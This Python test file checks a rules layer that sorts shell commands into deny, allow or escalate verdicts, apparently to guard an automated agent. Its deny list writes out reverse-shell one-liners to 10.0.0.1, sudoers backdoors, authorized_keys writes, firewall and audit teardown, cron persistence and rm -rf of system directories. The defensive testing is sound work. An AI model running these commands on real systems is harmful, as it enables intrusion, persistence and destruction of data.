"""Unit tests for the deterministic rules layer.

Two things are being verified:
  1. Hard-deny patterns fire regardless of context (and survive obfuscation
     that a naive substring check would miss).
  2. The allow list stays tight — nothing that needs session context is
     allowed deterministically; when unsure the verdict is UNDECIDED, never a
     silent ALLOW.
"""

import pytest

from sado.rules import ALLOW, DENY, UNDECIDED, check, is_privileged, split_segments


# --------------------------------------------------------------------------
# Hard DENY — must fire in every context
# --------------------------------------------------------------------------

DENY_CASES = [
    # auth db / sudoers / shadow
    ("useradd hacker", "auth-db-modify"),
    ("usermod -aG sudo hacker", "auth-db-modify"),
    ("sudo useradd -m -s /bin/bash backdoor", "auth-db-modify"),
    ("echo 'evil ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers", "sensitive-path-write"),
    ("echo 'evil ALL=(ALL) NOPASSWD:ALL' > /etc/sudoers.d/x", "sensitive-path-write"),
    ("tee -a /etc/passwd", "auth-file-write"),
    ("vim /etc/shadow", "auth-file-write"),
    ("sed -i 's/x/y/' /etc/sudoers", "auth-file-write"),
    # ssh trust
    ("cp key.pub /root/.ssh/authorized_keys", "ssh-config-write"),
    ("echo ssh-rsa AAAA... >> /root/.ssh/authorized_keys", "sensitive-path-write"),
    # firewall
    ("ufw disable", "firewall-teardown"),
    ("sudo iptables -F", "firewall-teardown"),
    ("iptables --flush", "firewall-teardown"),
    ("systemctl stop firewalld", "firewall-teardown"),
    ("nft flush ruleset", "firewall-teardown"),
    # sshd
    ("systemctl stop sshd", "sshd-teardown"),
    ("systemctl disable ssh", "sshd-teardown"),
    ("service ssh stop", "security-tool-teardown"),
    # security tooling
    ("systemctl stop fail2ban", "security-tool-teardown"),
    ("systemctl disable auditd", "security-tool-teardown"),
    ("apt-get remove -y fail2ban", "security-tool-teardown"),
    ("apt purge auditd", "security-tool-teardown"),
    ("setenforce 0", "security-tool-teardown"),
    ("auditctl -e 0", "security-tool-teardown"),
    # cron persistence
    ("echo '* * * * * root sh' > /etc/cron.d/x", "sensitive-path-write"),
    ("crontab -", "cron-persistence"),
    ("crontab /tmp/evil", "cron-persistence"),
    # systemd unit outside project
    ("cp evil.service /etc/systemd/system/evil.service", "systemd-unit-write"),
    # rm of system dirs
    ("rm -rf /", "rm-system-dir"),
    ("rm -rf /*", "rm-system-dir"),
    ("sudo rm -rf /usr", "rm-system-dir"),
    ("rm -rf /etc", "rm-system-dir"),
    ("rm -rf /boot/", "rm-system-dir"),
    # subpaths of pure system trees are just as destructive
    ("rm -rf /usr/local/lib", "rm-system-dir"),
    ("rm -rf /usr/*", "rm-system-dir"),
    ("rm -rf /lib/x86_64-linux-gnu", "rm-system-dir"),
    ("rm -rf /etc/nginx", "rm-system-dir"),
    # top-level of a data-bearing root
    ("rm -rf /var", "rm-system-dir"),
    ("rm -rf /home", "rm-system-dir"),
    # reverse shells / tunnels
    ("ngrok http 80", "tunnel-tool"),
    ("apt-get install -y ngrok", "tunnel-tool"),
    ("npm install -g localtunnel", "tunnel-tool"),
    ("nc -e /bin/sh 10.0.0.1 4444", "reverse-shell"),
    ("ncat --exec /bin/bash 10.0.0.1 4444", "reverse-shell"),
    ("socat TCP:10.0.0.1:4444 EXEC:/bin/sh", "reverse-shell"),
    ("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1", "reverse-shell"),
]


@pytest.mark.parametrize("command,rule", DENY_CASES)
def test_hard_deny(command, rule):
    d = check(command, cwd="/home/dev/project")
    assert d.verdict == DENY, f"expected DENY for {command!r}, got {d}"
    assert d.rule == rule, f"{command!r}: expected rule {rule}, got {d.rule}"


def test_deny_wins_in_chain_regardless_of_position():
    assert check("cd /tmp && ls && rm -rf /etc").verdict == DENY
    assert check("systemctl status nginx; ufw disable").verdict == DENY


def test_deny_survives_wrapper_obfuscation():
    assert check("sudo -u root env FOO=bar useradd evil").verdict == DENY
    assert check("nohup sudo rm -rf /usr").verdict == DENY
    assert check("timeout 5 sudo iptables -F").verdict == DENY


def test_deny_inside_nested_shell():
    assert check("bash -c 'rm -rf /etc'").verdict == DENY
    assert check("sh -c \"ufw disable\"").verdict == DENY


# --------------------------------------------------------------------------
# Context-free ALLOW — read-only or provably project-scoped
# --------------------------------------------------------------------------

ALLOW_CASES = [
    "systemctl status nginx",
    "sudo systemctl status docker",
    "journalctl -u nginx --since '1 hour ago'",
    "systemctl is-active sshd",
    "apt-get update",
    "iptables -L -n",
    "ip addr show",
    "ip route list",
    "sysctl vm.swappiness",
]


@pytest.mark.parametrize("command", ALLOW_CASES)
def test_context_free_allow(command):
    d = check(command, cwd="/home/dev/project")
    assert d.verdict == ALLOW, f"expected ALLOW for {command!r}, got {d}"


def test_project_scoped_file_ops_allow():
    assert check("mkdir -p build/out", cwd="/home/dev/project").verdict == ALLOW
    assert check("chmod 755 dist/app", cwd="/home/dev/project").verdict == ALLOW
    assert check("chown dev:dev src", cwd="/home/dev/project").verdict == ALLOW


def test_chained_read_only_allow():
    assert check("systemctl status nginx && journalctl -u nginx").verdict == ALLOW


# --------------------------------------------------------------------------
# UNDECIDED — must escalate, never silently allow or deny
# --------------------------------------------------------------------------

UNDECIDED_CASES = [
    # package install of a non-tunnel tool: contextual
    "apt-get install -y nmap",
    "apt-get install -y tcpdump",
    # service restart/start: contextual (was it started this session?)
    "systemctl restart nginx",
    "systemctl start docker",
    # file ops outside project dir
    "chmod 755 /var/www/html",
    "chown root:root /etc/nginx/nginx.conf",
    # kernel / network mutation
    "sysctl -w net.ipv4.ip_forward=1",
    "mount -o remount,rw /",
    "iptables -A INPUT -p tcp --dport 22 -j DROP",
]


@pytest.mark.parametrize("command", UNDECIDED_CASES)
def test_escalates_to_judge(command):
    d = check(command, cwd="/tmp")
    assert d.verdict == UNDECIDED, f"expected UNDECIDED for {command!r}, got {d}"


def test_project_scoped_ops_outside_cwd_are_not_allowed():
    # same command, but cwd doesn't contain the target → must not auto-allow
    assert check("chmod 755 /var/www/html", cwd="/home/dev/project").verdict == UNDECIDED
    assert check("mkdir -p /opt/thing", cwd="/home/dev/project").verdict == UNDECIDED


def test_project_subpaths_of_data_roots_still_escalate():
    # recursive rm inside a data-bearing root is contextual, not a hard-deny —
    # deleting a project's own build dir under /var/www or /home is legitimate.
    assert check("rm -rf /var/www/site/cache", cwd="/var/www/site").verdict == UNDECIDED
    assert check("rm -rf /home/dev/project/build", cwd="/home/dev/project").verdict == UNDECIDED
    assert check("rm -rf /opt/myapp/tmp", cwd="/opt/myapp").verdict == UNDECIDED


def test_glob_and_var_paths_never_project_allowed():
    assert check("chmod -R 777 $HOME", cwd="/home/dev/project").verdict == UNDECIDED
    assert check("chmod 755 ../*", cwd="/home/dev/project").verdict == UNDECIDED


# --------------------------------------------------------------------------
# Fail-closed behavior
# --------------------------------------------------------------------------

def test_substitution_is_never_allowed():
    # read-only-looking but contains command substitution → opaque → escalate
    d = check("systemctl status $(cat /tmp/x)", cwd="/tmp")
    assert d.verdict == UNDECIDED


def test_substitution_still_denies_on_other_evidence():
    assert check("rm -rf /etc $(whoami)", cwd="/tmp").verdict == DENY


def test_read_only_command_reading_sensitive_file_escalates_not_denies():
    # cat /etc/shadow is disclosure — policy leaves that to context, so it
    # must escalate, not hard-deny (which would be the wrong rule attribution).
    d = check("cat /etc/shadow", cwd="/tmp")
    assert d.verdict == UNDECIDED


# --------------------------------------------------------------------------
# Helpers
# --------------------------------------------------------------------------

def test_split_segments_respects_quotes():
    assert split_segments("echo 'a; b' && ls") == ["echo 'a; b'", "ls"]


def test_is_privileged():
    assert is_privileged("sudo systemctl restart nginx")
    assert is_privileged("cd /x && sudo rm foo")
    assert is_privileged("doas pkg_add x")
    assert not is_privileged("systemctl restart nginx")
    assert not is_privileged("ls -la")
